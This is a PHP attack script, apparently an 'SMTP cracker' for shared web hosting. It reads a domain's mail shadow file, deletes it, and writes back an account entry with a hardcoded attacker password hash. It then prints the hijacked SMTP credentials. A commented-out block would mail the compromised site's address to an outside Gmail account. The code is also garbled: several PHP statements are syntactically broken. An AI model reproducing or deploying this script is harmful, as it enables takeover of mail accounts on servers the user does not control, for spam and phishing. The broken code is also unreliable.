<?php
set_time_limit(0);
ini_set('max_execution_time', 0);

$User = get_current_user();
$Env = getenv("REMOTE_ADDR");
$Host = gethostbyaddr($Env);
/*
$Next = "Link SMTP : https://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']. \"\n\r";
$Skam = "cybercoode@gmail.com";
$msg = "New SMTP Uploaded !!";
$head = "From: SMTP<cybercoodr@gmail.com>";
$head = "MIME-Version: 1.0";
@mail($skam, $msg, $Next);
*/
$Pass = '@xBlackx_Coder'; #Sankess*+. -> Old Skam Pass
$Enc = crypt($Pass,'$6$roottn$');
$SR_NAME = $_SERVER["SERVER_NAME"];
$SSHIT = str_replace('www.','');
$OHSHIT = file_get_contents('/home/'.$User.'/etc/'.$SSHIT.'/shadow');
$SM = explode('\r\n',$OHSHIT);
@link('/home/'.$User.'/etc/'.$SSHIT.'/shadow', '/home'.$User.'/etc/'.$SSHIT.'/shadow.roottn.bak');
@unlink('/home/'.$User.'/etc/'.$SSHIT.'/shadow');

foreach $SM as $SM {
    $SM = explode(':',$SM);
}

$SMT = $SM[0];

if ($SMT) {
    $save = fopen('/home/'.$User.'/etc/'.$SSHIT.'/shadow','ab');
            fwrite($save,$SMT.':'.$Enc'/etc'.$SSHIT.'/shadow','ab');
            fclose($save);
echo "Your SMTP :- ".$SSHIT."|25|".$SMT."@".$SSHIT."|".$Pass."[Thanks To xBlackx]";
}else{
    echo 'Failed To Get Smtp';
}
?>